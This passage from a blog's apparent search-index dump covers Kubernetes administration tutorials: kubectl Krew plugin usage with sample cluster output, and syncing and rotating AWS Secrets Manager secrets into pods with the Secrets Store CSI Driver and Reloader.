ServiceAccount | Role | kube-prometheus-stack | kube-prometheus-stack-grafana kube-prometheus-stack-kube-state-metrics | ServiceAccount | ClusterRole | | kube-prometheus-stack-kube-state-metrics kube-prometheus-stack-operator | ServiceAccount | ClusterRole | | kube-prometheus-stack-operator kube-prometheus-stack-prometheus | ServiceAccount | ClusterRole | | kube-prometheus-stack-prometheus Visualize Kubernetes RBAC relationships: kubectl rbac-tool visualize --include-namespaces ingress-nginx,external-dns --outfile \"${TMP_DIR}/rbac.html\" rbac-tool visualize resource-capacity This plugin provides an overview of resource requests, limits, and utilization in a Kubernetes cluster. Installation of the resource-capacity Krew plugin: kubectl krew install resource-capacity Display resource requests, limits, and utilization for nodes: kubectl resource-capacity --pod-count --util NODE CPU REQUESTS CPU LIMITS CPU UTIL MEMORY REQUESTS MEMORY LIMITS MEMORY UTIL POD COUNT * 1130m (29%) 400m (10%) 135m (3%) 1250Mi (27%) 5048Mi (110%) 2423Mi (53%) 29/220 ip-192-168-26-84.ec2.internal 515m (26%) 0m (0%) 72m (3%) 590Mi (25%) 2644Mi (116%) 1320Mi (57%) 16/110 ip-192-168-7-23.ec2.internal 615m (31%) 400m (20%) 64m (3%) 660Mi (29%) 2404Mi (105%) 1103Mi (48%) 13/110 List resource requests, limits, and utilization for pods: kubectl resource-capacity --pods --util NODE NAMESPACE POD CPU REQUESTS CPU LIMITS CPU UTIL MEMORY REQUESTS MEMORY LIMITS MEMORY UTIL * * * 1130m (29%) 400m (10%) 142m (3%) 1250Mi (27%) 5048Mi (110%) 2414Mi (53%) ip-192-168-26-84.ec2.internal * * 515m (26%) 0m (0%) 79m (4%) 590Mi (25%) 2644Mi (116%) 1315Mi (57%) ip-192-168-26-84.ec2.internal kube-system aws-node-79jc6 25m (1%) 0m (0%) 3m (0%) 0Mi (0%) 0Mi (0%) 32Mi (1%) ip-192-168-26-84.ec2.internal kube-system aws-node-termination-handler-hj8hm 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 12Mi (0%) ip-192-168-26-84.ec2.internal cert-manager cert-manager-777fbdc9f8-ng8dg 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 25Mi (1%) ip-192-168-26-84.ec2.internal cert-manager cert-manager-cainjector-65857fccf8-krpr9 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 22Mi (0%) ip-192-168-26-84.ec2.internal cert-manager cert-manager-webhook-54f9d96756-plv84 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 10Mi (0%) ip-192-168-26-84.ec2.internal kube-system coredns-7975d6fb9b-hqmxm 100m (5%) 0m (0%) 1m (0%) 70Mi (3%) 170Mi (7%) 16Mi (0%) ip-192-168-26-84.ec2.internal kube-system coredns-7975d6fb9b-jhzkw 100m (5%) 0m (0%) 2m (0%) 70Mi (3%) 170Mi (7%) 15Mi (0%) ip-192-168-26-84.ec2.internal kube-system ebs-csi-controller-8cc6766cf-nsk5r 60m (3%) 0m (0%) 3m (0%) 240Mi (10%) 1536Mi (67%) 61Mi (2%) ip-192-168-26-84.ec2.internal kube-system ebs-csi-node-mct6d 30m (1%) 0m (0%) 1m (0%) 120Mi (5%) 768Mi (33%) 22Mi (0%) ip-192-168-26-84.ec2.internal ingress-nginx ingress-nginx-controller-9d7cf6ffb-xcw5t 100m (5%) 0m (0%) 1m (0%) 90Mi (3%) 0Mi (0%) 84Mi (3%) ip-192-168-26-84.ec2.internal karpenter karpenter-6bd66c788f-xnc4s 0m (0%) 0m (0%) 11m (0%) 0Mi (0%) 0Mi (0%) 146Mi (6%) ip-192-168-26-84.ec2.internal kube-prometheus-stack kube-prometheus-stack-grafana-896f8645-6q9lb 0m (0%) 0m (0%) 8m (0%) 0Mi (0%) 0Mi (0%) 229Mi (10%) ip-192-168-26-84.ec2.internal kube-prometheus-stack kube-prometheus-stack-prometheus-node-exporter-m4k5m 0m (0%) 0m (0%) 3m (0%) 0Mi (0%) 0Mi (0%) 10Mi (0%) ip-192-168-26-84.ec2.internal kube-system kube-proxy-6rfnc 100m (5%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 12Mi (0%) ip-192-168-26-84.ec2.internal kube-system metrics-server-57bd7b96f9-nllnn 0m (0%) 0m (0%) 3m (0%) 0Mi (0%) 0Mi (0%) 20Mi (0%) ip-192-168-26-84.ec2.internal oauth2-proxy oauth2-proxy-87bd47488-v97kg 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 8Mi (0%) ip-192-168-7-23.ec2.internal * * 615m (31%) 400m (20%) 64m (3%) 660Mi (29%) 2404Mi (105%) 1099Mi (48%) ip-192-168-7-23.ec2.internal kube-prometheus-stack alertmanager-kube-prometheus-stack-alertmanager-0 200m (10%) 200m (10%) 1m (0%) 250Mi (10%) 50Mi (2%) 20Mi (0%) ip-192-168-7-23.ec2.internal kube-system aws-node-bg2hc 25m (1%) 0m (0%) 2m (0%) 0Mi (0%) 0Mi (0%) 34Mi (1%) ip-192-168-7-23.ec2.internal kube-system aws-node-termination-handler-s66vl 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 12Mi (0%) ip-192-168-7-23.ec2.internal kube-system ebs-csi-controller-8cc6766cf-6v668 60m (3%) 0m (0%) 2m (0%) 240Mi (10%) 1536Mi (67%) 55Mi (2%) ip-192-168-7-23.ec2.internal kube-system ebs-csi-node-zx7bk 30m (1%) 0m (0%) 1m (0%) 120Mi (5%) 768Mi (33%) 21Mi (0%) ip-192-168-7-23.ec2.internal external-dns external-dns-7fdb8769ff-dxpdn 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 21Mi (0%) ip-192-168-7-23.ec2.internal forecastle forecastle-58d7ccb8f8-hlsf5 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 5Mi (0%) ip-192-168-7-23.ec2.internal kube-prometheus-stack kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb 0m (0%) 0m (0%) 2m (0%) 0Mi (0%) 0Mi (0%) 13Mi (0%) ip-192-168-7-23.ec2.internal kube-prometheus-stack kube-prometheus-stack-operator-7f45586f68-9rz6j 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 24Mi (1%) ip-192-168-7-23.ec2.internal kube-prometheus-stack kube-prometheus-stack-prometheus-node-exporter-x5bhm 0m (0%) 0m (0%) 2m (0%) 0Mi (0%) 0Mi (0%) 10Mi (0%) ip-192-168-7-23.ec2.internal kube-system kube-proxy-gzqct 100m (5%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 13Mi (0%) ip-192-168-7-23.ec2.internal mailhog mailhog-6f54fccf85-dgbp2 0m (0%) 0m (0%) 1m (0%) 0Mi (0%) 0Mi (0%) 4Mi (0%) ip-192-168-7-23.ec2.internal kube-prometheus-stack prometheus-kube-prometheus-stack-prometheus-0 200m (10%) 200m (10%) 25m (1%) 50Mi (2%) 50Mi (2%) 415Mi (18%) rolesum This plugin summarizes Kubernetes RBAC roles for specified subjects. Installation of the rbac-tool Krew plugin: kubectl krew install rolesum Show details for the karpenter ServiceAccount: kubectl rolesum --namespace karpenter karpenter rolesum screenshot stern A tool for multi-pod and multi-container log tailing in Kubernetes. Installation of the stern Krew plugin: kubectl krew install stern Check logs for all pods in the cert-manager namespace from the past hour: kubectl stern -n cert-manager . --tail 5 --since 1h --no-follow stern screenshot view-allocations This kubectl plugin lists resource allocations (CPU, memory, GPU, etc.) as defined in the manifests of nodes and running pods. Installation of the view-allocations Krew plugin: kubectl krew install view-allocations kubectl view-allocations --utilization view-allocations screenshot viewnode Viewnode displays Kubernetes cluster nodes along with their pods and containers. Installation of the viewnode Krew plugin: kubectl krew install viewnode kubectl viewnode --all-namespaces --show-metrics 29 pod(s) in total 0 unscheduled pod(s) 2 running node(s) with 29 scheduled pod(s): - ip-192-168-19-143.ec2.internal running 16 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 1.3 GiB) * cert-manager: cert-manager-777fbdc9f8-qhk2d (running | mem usage: 24.8 MiB) * cert-manager: cert-manager-cainjector-65857fccf8-t68lk (running | mem usage: 22.4 MiB) * cert-manager: cert-manager-webhook-54f9d96756-8nbqx (running | mem usage: 9.4 MiB) * ingress-nginx: ingress-nginx-controller-9d7cf6ffb-vtjhx (running | mem usage: 74.3 MiB) * karpenter: karpenter-79455db76f-79q7h (running | mem usage: 164.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-grafana-896f8645-972n2 (running | mem usage: 232.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-rw9kh (running | mem usage: 8.0 MiB) * kube-system: aws-node-gfn9v (running | mem usage: 30.8 MiB) * kube-system: aws-node-termination-handler-fhcmv (running | mem usage: 11.9 MiB) * kube-system: coredns-7975d6fb9b-29885 (running | mem usage: 14.8 MiB) * kube-system: coredns-7975d6fb9b-mrfws (running | mem usage: 14.6 MiB) * kube-system: ebs-csi-controller-8cc6766cf-x5mb9 (running | mem usage: 55.3 MiB) * kube-system: ebs-csi-node-xtqww (running | mem usage: 21.2 MiB) * kube-system: kube-proxy-c97d8 (running | mem usage: 11.9 MiB) * kube-system: metrics-server-57bd7b96f9-mqnqq (running | mem usage: 17.7 MiB) * oauth2-proxy: oauth2-proxy-66b84b895c-8hv8d (running | mem usage: 6.8 MiB) - ip-192-168-3-70.ec2.internal running 13 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 940.6 MiB) * external-dns: external-dns-7fdb8769ff-hjsxr (running | mem usage: 19.6 MiB) * forecastle: forecastle-58d7ccb8f8-l9dfs (running | mem usage: 4.3 MiB) * kube-prometheus-stack: alertmanager-kube-prometheus-stack-alertmanager-0 (running | mem usage: 18.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-kube-state-metrics-669bd5c594-jqcjb (running | mem usage: 12.2 MiB) * kube-prometheus-stack: kube-prometheus-stack-operator-7f45586f68-jfzhb (running | mem usage: 22.8 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-g7t7l (running | mem usage: 8.5 MiB) * kube-prometheus-stack: prometheus-kube-prometheus-stack-prometheus-0 (running | mem usage: 328.1 MiB) * kube-system: aws-node-termination-handler-hrjv8 (running | mem usage: 11.9 MiB) * kube-system: aws-node-vsr54 (running | mem usage: 30.8 MiB) * kube-system: ebs-csi-controller-8cc6766cf-69plv (running | mem usage: 53.0 MiB) * kube-system: ebs-csi-node-j6p6d (running | mem usage: 21.5 MiB) * kube-system: kube-proxy-d6wqx (running | mem usage: 10.5 MiB) * mailhog: mailhog-6f54fccf85-6s7bt (running | mem usage: 3.4 MiB) Show various details for the kube-prometheus-stack namespace: kubectl viewnode -n kube-prometheus-stack --container-block-view --show-containers --show-metrics --show-pod-start-times --show-requests-and-limits 7 pod(s) in total 0 unscheduled pod(s) 2 running node(s) with 7 scheduled pod(s): - ip-192-168-19-143.ec2.internal running 2 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 1.3 GiB) * kube-prometheus-stack-grafana-896f8645-972n2 (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 229.3 MiB) 3 container/s: 0: grafana (running) [cpu: - | mem: - | mem usage: 86.7 MiB] 1: grafana-sc-dashboard (running) [cpu: - | mem: - | mem usage: 70.6 MiB] 2: grafana-sc-datasources (running) [cpu: - | mem: - | mem usage: 72.0 MiB] * kube-prometheus-stack-prometheus-node-exporter-rw9kh (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 8.2 MiB) 1 container/s: 0: node-exporter (running) [cpu: - | mem: - | mem usage: 8.2 MiB] - ip-192-168-3-70.ec2.internal running 5 pod(s) (linux/arm64/containerd://1.6.20+bottlerocket | mem: 942.2 MiB) * alertmanager-kube-prometheus-stack-alertmanager-0 (running/Sat Jun 24 11:34:15 UTC 2023 | mem usage: 18.2 MiB) 2 container/s: 0: alertmanager (running) [cpu: - | mem: 200Mi&lt;- | mem usage: 15.6 MiB] 1: config-reloader (running) [cpu: 200m&lt;200m | mem: 50Mi&lt;50Mi | mem usage: 2.7 MiB] * kube-prometheus-stack-kube-state-metrics-669bd5c594-jqcjb (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 12.2 MiB) 1 container/s: 0: kube-state-metrics (running) [cpu: - | mem: - | mem usage: 12.2 MiB] * kube-prometheus-stack-operator-7f45586f68-jfzhb (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 22.5 MiB) 1 container/s: 0: kube-prometheus-stack (running) [cpu: - | mem: - | mem usage: 22.5 MiB] * kube-prometheus-stack-prometheus-node-exporter-g7t7l (running/Sat Jun 24 11:34:12 UTC 2023 | mem usage: 8.7 MiB) 1 container/s: 0: node-exporter (running) [cpu: - | mem: - | mem usage: 8.7 MiB] * prometheus-kube-prometheus-stack-prometheus-0 (running/Sat Jun 24 11:34:20 UTC 2023 | mem usage: 328.1 MiB) 2 container/s: 0: config-reloader (running) [cpu: 200m&lt;200m | mem: 50Mi&lt;50Mi | mem usage: 6.0 MiB] 1: prometheus (running) [cpu: - | mem: - | mem usage: 322.0 MiB] There are a few other kubectl Krew plugins that I have looked at but am not currently using: aks, view-cert, cost, cyclonus, graph, ingress-nginx node-shell, nodepools, np-viewer, oomd, permissions, popeye, pv-migrate, score, ssh-jump, tree, unlimited, whoami Clean-up Remove files from the ${TMP_DIR} directory: for FILE in \"${TMP_DIR}\"/{krew-linux_amd64,rbac.html}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "Secrets Store CSI Driver and Reloader", "url": "/posts/secrets-store-csi-driver-reloader/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security", "date": "2023-04-01 00:00:00 +0200", "content": "Sometimes it is necessary to store secrets in services like HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or others, and then use them in Kubernetes. In this post, I would like to explore how to store secrets in AWS Secrets Manager, retrieve them using the Kubernetes Secrets Store CSI Driver with the AWS Secrets and Configuration Provider (ASCP), and then use them both as Kubernetes Secrets and as files mounted directly into pods. When a Secret is rotated and has been defined as an environment variable in the Pod specification (using secretKeyRef), it is necessary to refresh or restart the pod. This can be achieved using tools like Reloader. secrets-store-csi-driver architecture Links: Use AWS Secrets Manager secrets in Amazon Elastic Kubernetes Service How to use AWS Secrets &amp; Configuration Provider with your Kubernetes Secrets Store CSI driver Stakater Reloader docs Requirements An Amazon EKS cluster (as described in “Cheapest Amazon EKS)” Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Create secret in AWS Secrets Manager Use CloudFormation to create a Policy and Secrets in AWS Secrets Manager: cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/aws-secretmanager-secret.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Secret Manager and policy Parameters: ClusterFQDN: Description: \"Cluster FQDN. (domain for all applications) Ex: kube1.k8s.mylabs.dev\" Type: String Resources: SecretsManagerKuardSecretPolicy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"${ClusterFQDN}-SecretsManagerKuardSecret\" Description: !Sub \"Policy required by SecretsManager to access to Secrets Manager ${ClusterFQDN}-KuardSecret\" PolicyDocument: Version: \"2012-10-17\" Statement: - Sid: SecretActions Effect: Allow Action: - \"secretsmanager:GetSecretValue\" - \"secretsmanager:DescribeSecret\" Resource: !Ref SecretsManagerKuardSecret SecretsManagerKuardSecret: Type: AWS::SecretsManager::Secret Properties: Name: !Sub \"${ClusterFQDN}-KuardSecret\" Description: My Secret GenerateSecretString: SecretStringTemplate: \"{\\\"username\\\": \\\"admin123\\\"}\" GenerateStringKey: password PasswordLength: 16 ExcludePunctuation: true Outputs: SecretsManagerKuardSecretArn: Description: The ARN of the created Amazon SecretsManagerKuardSecret Secret Value: !Ref SecretsManagerKuardSecret SecretsManagerKuardSecretPolicyArn: Description: The ARN of the created SecretsManagerKuardSecret Policy Value: !Ref SecretsManagerKuardSecretPolicy EOF aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"ClusterFQDN=${CLUSTER_FQDN}\" \\ --stack-name \"${CLUSTER_NAME}-aws-secretmanager-secret\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-secretmanager-secret.yml\" Screenshot from AWS Secrets Manager: AWS Secrets Manager - Secrets - k01.k8s.mylabs.dev-KuardSecret Install Secrets Store CSI Driver and AWS Provider Install the secrets-store-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=secrets-store-csi-driver registryUrl=https://kubernetes-sigs.github.io/secrets-store-csi-driver/charts SECRETS_STORE_CSI_DRIVER_HELM_CHART_VERSION=\"1.4.1\" helm repo add --force-update secrets-store-csi-driver https://kubernetes-sigs.github.io/secrets-store-csi-driver/charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-secrets-store-csi-driver.yml\" &lt;&lt; EOF syncSecret: enabled: true enableSecretRotation: true EOF helm upgrade --install --version \"${SECRETS_STORE_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace secrets-store-csi-driver --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-secrets-store-csi-driver.yml\" secrets-store-csi-driver secrets-store-csi-driver/secrets-store-csi-driver Install the secrets-store-csi-driver-provider-aws Helm chart: # renovate: datasource=helm depName=secrets-store-csi-driver-provider-aws registryUrl=https://aws.github.io/secrets-store-csi-driver-provider-aws SECRETS_STORE_CSI_DRIVER_PROVIDER_AWS_HELM_CHART_VERSION=\"0.3.6\" helm repo add --force-update aws-secrets-manager https://aws.github.io/secrets-store-csi-driver-provider-aws helm upgrade --install --version \"${SECRETS_STORE_CSI_DRIVER_PROVIDER_AWS_HELM_CHART_VERSION}\" --namespace secrets-store-csi-driver --create-namespace --wait secrets-store-csi-driver-provider-aws aws-secrets-manager/secrets-store-csi-driver-provider-aws The necessary components are now ready. Install kuard Kuard is a simple application that can be used to display various pod details, created for the book “Kubernetes: Up and Running”. Install Kuard, which will use the secrets from AWS Secrets Manager as a mountpoint and also as a Kubernetes Secret. SECRETS_MANAGER_KUARDSECRET_POLICY_ARN=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-aws-secretmanager-secret\" --query \"Stacks[0].Outputs[?OutputKey==\\`SecretsManagerKuardSecretPolicyArn\\`].OutputValue\" --output text) eksctl create iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=kuard --namespace=kuard --attach-policy-arn=\"${SECRETS_MANAGER_KUARDSECRET_POLICY_ARN}\" --role-name=\"eksctl-${CLUSTER_NAME}-irsa-kuard\" --approve Create the SecretProviderClass. This object tells the AWS provider which secrets to mount in the pod. It will also create a Secret named kuard-secret that will be synchronized with the data stored in AWS Secrets Manager. kubectl apply -f - &lt;&lt; EOF apiVersion: secrets-store.csi.x-k8s.io/v1alpha1 kind: SecretProviderClass metadata: name: kuard-deployment-aws-secrets namespace: kuard spec: provider: aws parameters: objects: | - objectName: \"${CLUSTER_FQDN}-KuardSecret\" objectType: \"secretsmanager\" objectAlias: KuardSecret secretObjects: - secretName: kuard-secret type: Opaque data: - objectName: KuardSecret key: username EOF Install Kuard and use the previously created SecretProviderClass: kubectl apply -f - &lt;&lt; EOF kind: Service apiVersion: v1 metadata: name: kuard namespace: kuard labels: app: kuard spec: selector: app: kuard ports: - protocol: TCP port: 80 targetPort: 8080 --- apiVersion: apps/v1 kind: Deployment metadata: name: kuard-deployment namespace: kuard labels: app: kuard spec: replicas: 2 selector: matchLabels: app: kuard template: metadata: labels: app: kuard spec: serviceAccountName: kuard affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - topologyKey: \"kubernetes.io/hostname\" labelSelector: matchLabels: app: kuard volumes: - name: secrets-store-inline csi: driver: secrets-store.csi.k8s.io readOnly: true volumeAttributes: secretProviderClass: \"kuard-deployment-aws-secrets\" containers: - name: kuard-deployment # renovate: datasource=docker depName=gcr.io/kuar-demo/kuard-arm64 extractVersion=^(?&lt;version&gt;.+)$ image: gcr.io/kuar-demo/kuard-arm64:v0.9-green resources: requests: cpu: 10m memory: \"32Mi\" limits: cpu: 20m memory: \"64Mi\" ports: - containerPort: 8080 volumeMounts: - name: secrets-store-inline mountPath: \"/mnt/secrets-store\" readOnly: true env: - name: KUARDSECRET valueFrom: secretKeyRef: name: kuard-secret key: username --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: kuard namespace: kuard annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/kubernetes/kubernetes/d9a58a39b69a0eaec5797e0f7a0f9472b4829ab0/logo/logo_with_border.svg forecastle.stakater.com/appName: Kuard nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri labels: app: kuard spec: rules: - host: kuard.${CLUSTER_FQDN} http: paths: - path: / pathType: ImplementationSpecific backend: service: name: kuard port: number: 8080 tls: - hosts: - kuard.${CLUSTER_FQDN} EOF After the successful deployment of Kuard, you should see the credentials in the kuard-secret: kubectl wait --namespace kuard --for condition=available deployment kuard-deployment kubectl get secrets -n kuard kuard-secret --template=\"{{.data.username}}\" | base64 -d | jq { \"password\": \"rxxxxxxxxxxxxxxH\", \"username\": \"admin123\" } You should see similar log messages in the secrets-store-csi-driver pods: kubectl logs -n secrets-store-csi-driver daemonsets/secrets-store-csi-driver Found 2 pods, using pod/secrets-store-csi-driver-2k9jv I0416 12:17:32.553991 1 exporter.go:35] \"initializing metrics backend\" backend=\"prometheus\" I0416 12:17:32.555766 1 main.go:190] \"starting manager\\n\" I0416 12:17:32.656785 1 secrets-store.go:46] \"Initializing Secrets Store CSI Driver\" driver=\"secrets-store.csi.k8s.io\" version=\"v1.3.2\" buildTime=\"2023-03-20-21:09\" I0416 12:17:32.656834 1 reconciler.go:130] \"starting rotation reconciler\" rotationPollInterval=\"2m0s\" I0416 12:17:32.660649 1 server.go:121] \"Listening for connections\" address=\"//csi/csi.sock\" I0416 12:17:34.082277 1 nodeserver.go:365] \"node: getting default node info\\n\" I0416 12:18:54.990977 1 nodeserver.go:359] \"Using gRPC client\" provider=\"aws\" pod=\"kuard-deployment-756f6cd885-6mzrq\" I0416 12:18:56.015817 1 nodeserver.go:254] \"node publish volume complete\" targetPath=\"/var/lib/kubelet/pods/ba66d6a4-1def-4636-b67a-99ca929e9293/volumes/kubernetes.io~csi/secrets-store-inline/mount\" pod=\"kuard/kuard-deployment-756f6cd885-6mzrq\" time=\"1.128414837s\" I0416 12:18:56.016290 1 secretproviderclasspodstatus_controller.go:222] \"reconcile started\" spcps=\"kuard/kuard-deployment-756f6cd885-6mzrq-kuard-kuard-deployment-aws-secrets\" I0416 12:18:56.220255 1 secretproviderclasspodstatus_controller.go:366] \"reconcile complete\" spc=\"kuard/kuard-deployment-aws-secrets\" pod=\"kuard/kuard-deployment-756f6cd885-6mzrq\" spcps=\"kuard/kuard-deployment-756f6cd885-6mzrq-kuard-kuard-deployment-aws-secrets\" Go to these URLs and check the credentials synced from AWS Secrets Manager: https://kuard.k01.k8s.mylabs.dev/fs/mnt/secrets-store/ kubectl exec -i -n kuard deployments/kuard-deployment -- cat /mnt/secrets-store/KuardSecret {\"password\":\"rxxxxxxxxxxxxxxH\",\"username\":\"admin123\"} https://kuard.k01.k8s.mylabs.dev/-/env kubectl exec -i -n kuard deployments/kuard-deployment -- sh -c \"echo \\${KUARDSECRET}\" {\"password\":\"rxxxxxxxxxxxxxxH\",\"username\":\"admin123\"} After executing the commands above, the secret from AWS Secrets Manager is copied to the Kubernetes Secret (kuard-secret). It is also present as a file (/mnt/secrets-store/KuardSecret) and as an environment variable (KUARDSECRET) inside the pod. Rotate AWS Secret Let’s change/rotate the credentials inside the AWS Secret to see if the change will also be reflected in the Kubernetes objects: aws secretsmanager update-secret --secret-id \"k01.k8s.mylabs.dev-KuardSecret\" \\ --secret-string \"{\\\"user\\\":\\\"admin123\\\",\\\"password\\\":\\\"EXAMPLE-PASSWORD\\\"}\" sleep 200 After changing the password in AWS Secrets Manager, you should also see the change in the Kubernetes Secret and in the /mnt/secrets-store/KuardSecret file inside the pod: kubectl get secrets -n kuard kuard-secret --template=\"{{.data.username}}\" | base64 -d | jq { \"user\": \"admin123\", \"password\": \"EXAMPLE-PASSWORD\" } AWS Secrets Manager - Secrets - k01.k8s.mylabs.dev-KuardSecret kubectl exec -i -n kuard deployments/kuard-deployment -- cat /mnt/secrets-store/KuardSecret {\"user\":\"admin123\",\"password\":\"EXAMPLE-PASSWORD\"} The environment variable inside the pod will not be changed automatically: kubectl exec -i -n kuard deployments/kuard-deployment -- sh -c \"echo \\${KUARDSECRET}\" {\"password\":\"rxxxxxxxxxxxxxxH\",\"username\":\"admin123\"} The only way to update a pre-defined environment variable inside the pod is to restart the pod. Install Reloader to do rolling upgrades when Secrets get changed In the case of changes to the Secret (kuard-secret), a rolling upgrade should be performed on the Deployment (kuard-deployment) to “refresh” the environment variables. It is time to use Reloader, which can perform this action automatically. Install the reloader Helm chart: # renovate: datasource=helm depName=reloader registryUrl=https://stakater.github.io/stakater-charts RELOADER_HELM_CHART_VERSION=\"1.0.69\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-reloader.yml\" &lt;&lt; EOF reloader: readOnlyRootFileSystem: true podMonitor: enabled: true EOF helm upgrade --install --version \"${RELOADER_HELM_CHART_VERSION}\" --namespace reloader --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-reloader.yml\" reloader stakater/reloader You need to annotate the kuard deployment to enable Pod rolling upgrades: kubectl annotate -n kuard deployment kuard-deployment 'reloader.stakater.com/auto=true' Let’s perform the credential change one more time: aws secretsmanager update-secret --secret-id \"k01.k8s.mylabs.dev-KuardSecret\" \\ --secret-string \"{\\\"user\\\":\\\"admin123\\\",\\\"password\\\":\\\"EXAMPLE-PASSWORD-2\\\"}\" sleep 400 Screenshot from AWS Secrets Manager: AWS Secrets Manager - Secrets - k01.k8s.mylabs.dev-KuardSecret After some time, changes are detected in the kuard-secret secret, and the pods are restarted: kubectl logs -n reloader deployments/reloader-reloader reloader-reloader time=\"2023-04-17T18:08:57Z\" level=info msg=\"Environment: Kubernetes\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"Starting Reloader\" time=\"2023-04-17T18:08:57Z\" level=warning msg=\"KUBERNETES_NAMESPACE is unset, will detect changes in all namespaces.\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"created controller for: configMaps\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"Starting Controller to watch resource type: configMaps\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"created controller for: secrets\" time=\"2023-04-17T18:08:57Z\" level=info msg=\"Starting Controller to watch resource type: secrets\" time=\"2023-04-17T18:12:17Z\" level=info msg=\"Changes detected in 'kuard-secret' of type 'SECRET' in namespace 'kuard', Updated 'kuard-deployment' of type 'Deployment' in namespace 'kuard'\" After the pods reload, the environment variable KUARDSECRET should contain the updated value: kubectl exec -i -n kuard deployments/kuard-deployment -- sh -c \"echo \\${KUARDSECRET}\" {\"user\":\"admin123\",\"password\":\"EXAMPLE-PASSWORD-2\"} It is possible to use and synchronize credentials from AWS Secrets Manager to the following locations within a pod: A file inside the pod A Kubernetes Secret An environment variable inside the pod To clean up the environment, delete the IRSA, remove the CloudFormation stack, and delete the namespace: if eksctl get iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=kuard --namespace=kuard; then eksctl delete iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=kuard --namespace=kuard fi aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-aws-secretmanager-secret\" Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{aws-secretmanager-secret,helm_values-{reloader,secrets-store-csi-driver}}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "Velero and cert-manager", "url": "/posts/velero-and-cert-manager/", "categories": "Kubernetes, Cloud", "tags": "amazon-eks, kubernetes, velero, cert-manager", "date": "2023-03-20 00:00:00 +0100", "content": "In a previous post, “Cheapest Amazon EKS”, I used cert-manager to obtain a wildcard certificate for the ingress. When using Let’s Encrypt production certificates, it can be handy to back them up and restore them if the cluster needs to be recreated. Here are a few steps on how to install Velero and the backup and restore procedure for cert-manager objects. Links: Backup and Restore Resources Requirements An Amazon EKS cluster (as described in “Cheapest Amazon EKS)” Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export 